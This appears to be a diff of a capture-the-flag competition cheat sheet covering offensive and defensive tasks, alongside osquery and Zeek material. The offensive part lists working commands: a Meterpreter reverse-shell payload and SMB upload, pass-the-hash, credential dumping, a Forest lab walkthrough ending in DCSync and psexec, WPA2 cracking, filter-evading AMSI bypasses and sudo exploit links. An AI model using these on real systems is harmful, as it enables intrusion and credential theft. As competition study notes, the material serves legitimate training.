@@ -17,10 +17,10 @@
     * Compile every clue and piece of information you've been given along the way and step back after 1 hour
 * Landing on a linux box
     * history
-    * find / -mtime -30 2>/dev/null
+    * find / -mtime -30 2\>/dev/null
     * grep -iR pcup{ .
     * updatedb/locate (special file extensions relevant to challenge, ex. png)
-    * cat other users .bash_history files
+    * cat other users .bash\_history files
 
 # OCO
 
@@ -33,21 +33,82 @@
     * https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#perl
 * Run everything through Burp
 
+## Wireless
+* Start monitor mode: airmon-ng start [interface]
+* List access points and frequencies: airodump-ng -b abg [interface]mon
+* Collect auth handshake: airodump-ng -c [target_channel] -w [filename] [interface]mon
+* Deauth client (allows you to collect handshake in above command): aireplay-ng -0 1 -a [access_point_mac] -c [client_mac] [interface]mon
+* Bruteforce pre-shared WPA2 key (they use rockyou): aircrack-ng -w [wordlist] [cap_file]
+* Decrypt collected traffic: airdecap-ng -e [ssid] -p [passphrase] [cap_file]
+
 ## Windows
 
 * Use `more` to open Alternate Data Streams
 * Base64: [System.Text.Encoding]::UTF8.GetSTring([System.convert]::FromBase64String("lkjasflkjasdfklj"))
-* Mimikatz syntax
+* Mimikatz
+    * sekurlsa::pth /user:Administrator /domain:winxp /ntlm:f193d757b4d487ab7e5a3743f038f713 /run:cmd
 * Responder syntax
+* msfvenom -p windows/x64/meterpreter_reverse_https -a x64 LHOST=192.168.58.128 LPORT=443 -f exe --platform Windows -o reverse_https.exe
+* Curl to smb upload files: curl --upload-file /root/reverse_https.exe -u 'windev2101eval\user' smb://192.168.58.153/c$/
 * Meterpreter Post
+    * https://www.offensive-security.com/metasploit-unleashed/post-module-reference/
+    * use windows/manage/multi_meterpreter_inject
+    * getuid
+    * sysinfo
+    * load kiwi      creds_all
+    * run post/windows/gather/credentials/credential_collector
+    * run post/windows/gather/smart_hashdump
+    * run post/windows/gather/bloodhound
+* Privesc
+    * use exploit/windows/local/cve_2020_0796_smbghost
+        * set SESSION $SESSION$
+    * run post/multi/recon/local_exploit_suggester
     * Dumphashes
     * lsa_dump_sam
     * dc_sync
     * steal_token
+    * Winpeas
+* Powershell
+    * ps | ? { $_.path -Match "C:\\" } | select name,Path
+* Red Teaming
+    * Forest HTB Walkthrough
+        * RPCClient
+            * Null LDAP queries: rpcclient -U "" -n 10.10.10.161 
+                * enumdomusers
+                * enumdomgroups
+        * Dump LDAP users: impacket-GetADUsers -all -no-pass -dc-ip 10.10.10.161 htb.local/
+        * Find ASREPRoast'able: impacket-GetNPUsers -usersfile users.txt -request -dc-ip 10.10.10.161 -no-pass htb.local/
+        * Hashcat for ASREP: hashcat -m 18200 svc-alfresco.kerb /usr/share/wordlists/rockyou.txt --force
+        * Evil-winrm
+            * evil-winrm -i 10.10.10.161 -u svc-alfresco -p s3rvice -s /root/tools/powershell_scripts/
+            * menu
+            * Bypass-4MSI
+            * SharpHound.ps1
+            * Invoke-BloodHound -collectionmethod all -domain htb.local -ldapuser svc-alfresco -ldappass s3rvice
+        * Add a user to privileged group 
+            * $pass = ConvertTo-SecureString "password" -AsPlainText -Force
+            * New-AdUser testt -AccountPassword $pass -Enabled $True
+            * Add-ADGroupMember -Identity "Exchange Windows Permissions" -members testt
+        * Escalate (without powerview)
+            * impacket-ntlmrelayx -t ldap://10.10.10.161 --escalate-user testt    (visit http://127.0.0.1) 
+        * Escalate (with powerview)
+            * Add-DomainObjectAcl -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity testt -Rights DCSync
+        * impacket-secretsdump -dc-ip 10.10.10.161 htb.local/testt:password@10.10.10.161
+        * impacket-psexec htb.local/administrator@10.10.10.161 'powershell.exe' -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6
+    * hascat for TGS: hashcat -m 13100 administrator.kerb /usr/share/wordlists/rockyou.txt --force -potfile-disable
+    * AMSI
+        * Disable AMSI (has been patched): [Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiInitFailed","NonPublic,Static").SetValue($null,$true)
+        * Same thing as above but evades filters: [Ref].Assembly.GetType("System.Management.Automation.Amsi"+"Utils").GetField("amsiIn"+"itFailed","NonPublic,Static").SetValue($null,$true)
+        * May need to run the command again if you get blocked again. Triggering AMSI too many times causes a lockout, then you can't even disable it.
+        * Here's a repo with more AMSI stuff: https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell (the above commands are the Matt Graebers Reflection method)
+
 
 ## Linux
 * Password bruteforce wordlist mangling generation:
     * rsmangler -p -d -r -t -T -c -u -l -s -e -I --punctuation -a -C --pna --pnb --na -nb --force --space --file words.txt --output wordsmangled.txt
+* Baron Samedit sudo vuln (CVE-2021-3156) - 1.8.2 to 1.8.31p2 and 1.9.0 to 1.9.5p1
+    * https://github.com/blasty/CVE-2021-3156/
+    * https://github.com/TH3xACE/SUDO_KILLER/tree/master/exploits/CVE-2021-3156 <- different exploits for different versions. See readme, pick one. 
 
 # DCO
 
@@ -88,6 +149,14 @@
 * If trying to find a specific attack (and not a vuln scanner) - look at user agents (python-requests)
     * Security Onion - HTTP dashboard, then scroll through user agents
 
+## OSQuery
+
+* Basic osquery info: SELECT * FROM osquery_info;
+* Check if Windows has bitlocker enabled: SELECT * FROM bitlocker_info;
+* Check if Linux has disk encryption: SELECT name, uuid, encrypted FROM disk_encryption WHERE uuid != "";
+* Get Linux users (can be used to find malicious ones): SELECT username, description, directory, uid FROM users;
+* Check for directory created by EternalRocks virus: SELECT * FROM file WHERE directory = "C:\\Program Files\\Microsoft Updates"
+* Cheat sheet for process interrogation: https://defensivedepth.files.wordpress.com/2018/10/osquery-handout.pdf
 
 ## Memory Forensics
 
@@ -158,6 +227,56 @@
     * $data = Get-ItemProperty "Registry::HKEY_CURRENT_USER\SOFTWARE\Microsoft\Office\15.0\Outlook\Profiles\Charles jackson\987124987102847\0000000009"
     * $pdata = $data[1..$data.Length]
     * [System.Text.Encoding]::Unicode.GetString([System.Security.Cryptography.ProtectedData]::Unprotect($pdata, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser))
+
+## Zeek Scripting
+    Run script: bro -i [interface] [script_file]
+    Count unique originating IPs from logfile: cat [log_file] | bro-cut id.orig_h | uniq -c
+    ** Print out new connections: **
+    @load base/protocols/conn
+    event new_connection (c: connection)
+    {
+        print c;
+    }
+    ** Print out new connections, formatted: **
+    @load base/protocols/conn
+    event new_connection(c: connection)
+    {
+        print fmt("Src IP/Port: (%s, %s) Dst IP/Port: (%s,%s)", c$id$orig_h, c$id$orig_p, c$id$resp_h, c$id$resp_p);
+    }
+    ** Log HTTP and SSH: **
+    module PortTest;
+    export{
+    #create global variable of ports to reference
+        global ports = {
+            80/tcp,
+            443/tcp,
+            22/tcp
+        };
+        redef enum Log::ID += { LOG };
+    #create a new connection_info record
+        type Connection_Info: record {
+            sip: addr    &log;
+            dip: addr    &log;
+            sport: port  &log;
+            dport: port  &log;
+        };
+    }
+    event new_connection(c: connection){
+    #stores the source/dest ips and ports
+        local temp_conn: PortTest::Connection_Info = [$sip=c$id$orig_h, $dip=c$id$resp_h, $sport=c$id$orig_p, $dport=c$id$resp_p];
+        if (c$id$resp_p in ports || c$id$orig_p in ports){
+            Log::write(PortTest::LOG, temp_conn);
+        }
+    }
+    #create a stream to our new log
+    event bro_init(){
+        Log::create_stream(PortTest::LOG, [$columns=Connection_Info, $path="port_test"]);
+    }
+
+# Reversing
+* Possibly useful (yara rule generation, etc): https://github.com/cmu-sei/pharos
+* For all windows - use FLOSS (strings - and read all of them)
+
 
 # Escape Room Thoughts
 * Closely record all hints
